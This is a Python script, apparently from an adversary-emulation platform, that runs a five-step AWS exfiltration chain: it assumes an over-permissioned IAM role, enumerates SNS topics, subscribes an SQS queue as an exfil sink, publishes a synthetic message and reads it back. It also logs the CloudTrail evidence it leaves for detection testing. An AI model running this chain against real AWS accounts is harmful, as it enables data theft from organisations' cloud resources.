# FILE: attack.py
"""
Atomic SNS External Subscription - Automated Attack Script (T1567)
5-step attack chain: AssumeRole -> SNS topic enumeration -> SQS exfil sink
subscription -> synthetic message publish -> SQS read-back delivery confirmation.
All steps run under a single victim STS session derived from an over-permissioned IAM role.
"""
import sys
import time
import random
import json
import boto3
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]


def print_step(msg):
    print(f"\n[*] {msg}")

def print_ok(msg):
    print(f"[+] {msg}")

def print_err(msg):
    print(f"[-] {msg}")

def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))

def phase_delay():
    time.sleep(random.uniform(5, 15))


def _assume_role_with_retry(sts_client, role_arn, session_name, duration=3600, max_attempts=5):
    """
    AssumeRole with propagation retry.
    New IAM roles + inline policies take a few seconds to become consistent;
    sts:AssumeRole can return AccessDenied during that window.
    """
    retryable = {"AccessDenied", "InvalidClientTokenId", "AuthFailure"}
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=session_name,
                DurationSeconds=duration,
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in retryable and attempt < max_attempts:
                print_ok(f"AssumeRole attempt {attempt}/{max_attempts} got {code} - retrying in 5s...")
                time.sleep(5)
                last_exc = e
            else:
                raise
    raise RuntimeError(f"AssumeRole failed after {max_attempts} attempts: {last_exc}")


def _bootstrap_session(outputs: dict, region: str):
    """Session for the initial STS AssumeRole call.

    In the MayaTrail backend the worker injects the tenant's short-lived
    assumed-role credentials as outputs['_aws_credentials']; use them so the
    attack runs in the tenant account, not the worker's. Falls back to the
    ambient default session for standalone runs.
    """
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """
    Backend emulation entry point.
    outputs: Pulumi stack outputs dict
    region:  AWS region for all boto3 clients
    """
    # -- Resolve required output keys --------------------------------------------
    victim_role_arn = outputs.get("victim_role_arn")
    topic_arn       = outputs.get("topic_arn")
    bait_topic_arn  = outputs.get("bait_topic_arn")
    sqs_sink_arn    = outputs.get("sqs_sink_arn")
    sqs_sink_url    = outputs.get("sqs_sink_url")

    missing = [k for k, v in {
        "victim_role_arn": victim_role_arn,
        "topic_arn":       topic_arn,
        "sqs_sink_arn":    sqs_sink_arn,
        "sqs_sink_url":    sqs_sink_url,
    }.items() if not v]
    if missing:
        raise RuntimeError(f"Missing required Pulumi outputs: {missing}")

    # -- PHASE 1: Exfiltration via SNS External Subscription --------------------
    print_step("PHASE 1 - Exfiltration via SNS External Subscription (T1567)")

    # -- Step 1: AssumeRole -> victim STS session --------------------------------
    print_step("Step 1: Assuming over-permissioned victim IAM role (T1567)")
    # Victim role carries intentionally broad SNS/SQS permissions, reflecting a
    # developer/service account that accumulated excess rights - a realistic
    # credential-access target per the TI extract.
    sts_default = _bootstrap_session(outputs, region).client("sts")
    try:
        assume_resp = _assume_role_with_retry(
            sts_default, victim_role_arn, "atomic-sns-exfil-session", duration=3600
        )
        victim_creds = assume_resp["Credentials"]
        print_ok(f"AssumeRole succeeded - session AccessKeyId={victim_creds['AccessKeyId']}")
    except (ClientError, RuntimeError) as e:
        raise RuntimeError(f"AssumeRole failed: {e}")

    victim_session = boto3.Session(
        aws_access_key_id=victim_creds["AccessKeyId"],
        aws_secret_access_key=victim_creds["SecretAccessKey"],
        aws_session_token=victim_creds["SessionToken"],
        region_name=region,
    )
    sns = victim_session.client("sns")
    sqs = victim_session.client("sqs")

    op_delay(2, 4)

    # -- Step 2: SNS topic enumeration ------------------------------------------
    print_step("Step 2: Enumerating SNS topics to identify target amid bait decoy (T1567 - discovery)")
    # Both the target topic and bait decoy appear in results, forcing enumeration
    # before subscribing - this models real attacker recon behavior.
    all_topics = []
    next_token = None
    while True:
        kwargs = {}
        if next_token:
            kwargs["NextToken"] = next_token
        try:
            resp = sns.list_topics(**kwargs)
        except ClientError as e:
            print_err(f"ListTopics failed: {e}")
            break
        all_topics.extend(resp.get("Topics", []))
        next_token = resp.get("NextToken")
        if not next_token:
            break

    found_target = None
    for t in all_topics:
        arn = t.get("TopicArn", "")
        if arn == topic_arn:
            found_target = arn
            print_ok(f"Target topic identified: {arn}")
        elif arn == bait_topic_arn:
            print_ok(f"Bait topic observed (skipped): {arn}")
        else:
            print_ok(f"Other topic observed: {arn}")

    if not found_target:
        print_err("Target topic not found in ListTopics results; using known ARN from outputs")
        found_target = topic_arn

    print_ok(f"Topic enumeration complete - {len(all_topics)} topic(s) listed")
    op_delay(2, 5)

    # -- Step 3: Subscribe SQS sink to target SNS topic (T1567 core) ------------
    print_step("Step 3: Subscribing SQS sink to target SNS topic (T1567 core - exfil sink registration)")
    # SNS auto-confirms SQS subscriptions without any confirmation handshake -
    # the subscription becomes active immediately. In a real T1567 attack, this
    # would be an attacker-controlled HTTPS or email endpoint. The Subscribe
    # CloudTrail event is the primary detection IOC.
    # One retry on AccessDenied: inline policy may not be effective immediately
    # even after AssumeRole succeeds (IAM propagation window).
    subscription_arn = None
    for sub_attempt in range(1, 3):
        try:
            sub_resp = sns.subscribe(
                TopicArn=found_target,
                Protocol="sqs",
                Endpoint=sqs_sink_arn,
                ReturnSubscriptionArn=True,
            )
            subscription_arn = sub_resp.get("SubscriptionArn")
            print_ok(f"Subscribe succeeded - SubscriptionArn={subscription_arn}")
            print_ok("SQS queue registered as SNS delivery endpoint (exfil sink active)")
            break
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code == "AccessDeniedException" and sub_attempt == 1:
                print_ok(f"Subscribe got AccessDenied on attempt {sub_attempt} - waiting 5s for IAM propagation...")
                time.sleep(5)
            else:
                print_err(f"SNS Subscribe failed ({code}): {e}")
                break

    op_delay(3, 6)

    # -- Step 4: Publish synthetic sensitive message (data-plane) ---------------
    print_step("Step 4: Publishing synthetic sensitive payload to SNS topic (T1567 - data exfil trigger)")
    # SNS Publish is a data-plane API call - not visible in CloudTrail management
    # events unless SNS data-plane logging is explicitly enabled per topic.
    message_body = json.dumps({
        "event": "credential_access",
        "actor": "atomic-sns-external-subscription",
        "technique": "T1567",
        "payload": "simulated-sensitive-notification",
    })
    published_message_id = None
    try:
        pub_resp = sns.publish(
            TopicArn=found_target,
            Subject="ATOMIC-SNS-EXFIL-TEST",
            Message=message_body,
        )
        published_message_id = pub_resp.get("MessageId")
        print_ok(f"Publish succeeded - MessageId={published_message_id}")
        print_ok("Synthetic sensitive notification delivered to all subscribers including SQS sink")
    except ClientError as e:
        print_err(f"SNS Publish failed: {e}")

    op_delay(3, 7)

    # -- Step 5: SQS read-back to confirm end-to-end delivery -------------------
    print_step("Step 5: Reading SQS sink queue to confirm end-to-end exfil delivery (T1567 - verify)")
    # Bounded retry loop: 3 attempts with 15-second long-poll each to handle
    # async SNS->SQS fan-out latency. SQS ReceiveMessage is data-plane only -
    # not in CloudTrail by default. Successful read-back proves both subscription
    # (Step 3) and queue policy are functioning.
    # Match against published_message_id to confirm this run's message, not a stale one.
    delivered = False
    for attempt in range(1, 4):
        print_step(f"SQS receive attempt {attempt}/3 (WaitTimeSeconds=15)...")
        try:
            recv_resp = sqs.receive_message(
                QueueUrl=sqs_sink_url,
                MaxNumberOfMessages=1,
                WaitTimeSeconds=15,
                VisibilityTimeout=30,
                AttributeNames=["All"],
                MessageAttributeNames=["All"],
            )
            messages = recv_resp.get("Messages", [])
            if messages:
                msg = messages[0]
                body = msg.get("Body", "")
                print_ok(f"Message received from SQS sink - SQS MessageId={msg.get('MessageId')}")
                try:
                    envelope = json.loads(body)
                    subject = envelope.get("Subject", "")
                    inner_msg = envelope.get("Message", "")
                    sns_msg_id = envelope.get("MessageId", "")
                    print_ok(f"SNS envelope Subject={subject}")
                    print_ok(f"SNS envelope MessageId={sns_msg_id}")
                    print_ok(f"SNS envelope Message (first 120 chars)={inner_msg[:120]}")
                    if "ATOMIC-SNS-EXFIL-TEST" in subject:
                        if published_message_id and sns_msg_id == published_message_id:
                            print_ok("MessageId matches published message - this run's delivery CONFIRMED")
                        elif published_message_id:
                            print_ok("MessageId does not match (stale message) - still confirms exfil path")
                        delivered = True
                        print_ok("End-to-end SNS->SQS exfil delivery CONFIRMED")
                except (json.JSONDecodeError, ValueError):
                    print_ok(f"Raw SQS body (first 200 chars): {body[:200]}")
                    delivered = True
                    print_ok("Message received (non-JSON body) - delivery CONFIRMED")
                break
            else:
                print_ok(f"No messages yet on attempt {attempt} - retrying...")
        except ClientError as e:
            print_err(f"SQS ReceiveMessage attempt {attempt} failed: {e}")
        if attempt < 3:
            op_delay(2, 4)

    if not delivered:
        print_err("SQS read-back did not receive expected message after 3 attempts")
        print_err("Possible causes: SNS->SQS fan-out latency exceeded retry window, or delivery failed")

    op_delay(2, 4)

    phase_delay()

    # -- Attack Summary ----------------------------------------------------------
    print("\n" + "=" * 60)
    print("[*] ATOMIC SNS EXTERNAL SUBSCRIPTION - ATTACK SUMMARY")
    print("=" * 60)
    print(f"[+] Step 1 - AssumeRole (T1567): victim session established")
    print(f"    AccessKeyId : {victim_creds['AccessKeyId']}")
    print(f"    RoleArn     : {victim_role_arn}")
    print(f"[+] Step 2 - ListTopics: {len(all_topics)} topic(s) enumerated, target identified")
    print(f"    Target topic: {found_target}")
    print(f"[+] Step 3 - Subscribe (T1567 core): SQS sink registered as exfil endpoint")
    print(f"    SubscriptionArn: {subscription_arn}")
    print(f"[+] Step 4 - Publish (data-plane): synthetic sensitive payload sent")
    print(f"    SNS MessageId  : {published_message_id}")
    print(f"[+] Step 5 - SQS read-back: "
          f"delivery {'CONFIRMED' if delivered else 'UNCONFIRMED (check fan-out latency)'}")
    print("=" * 60)
    print("[*] CloudTrail management events generated:")
    print("    - AssumeRole    sts.amazonaws.com  (from ambient execution principal)")
    print("    - ListTopics    sns.amazonaws.com  (from victim session)")
    print("    - Subscribe     sns.amazonaws.com  (T1567 core IOC, from victim session)")
    print("[*] Data-plane events (NOT in CloudTrail by default):")
    print("    - SNS Publish to target topic")
    print("    - SQS ReceiveMessage from sink queue")
    print("[*] Cleanup: pulumi destroy cascades SNS topic deletion -> subscription removed;")
    print("    SQS queue deletion -> delivered messages purged. STS session expires in 3600s.")
    print("=" * 60)
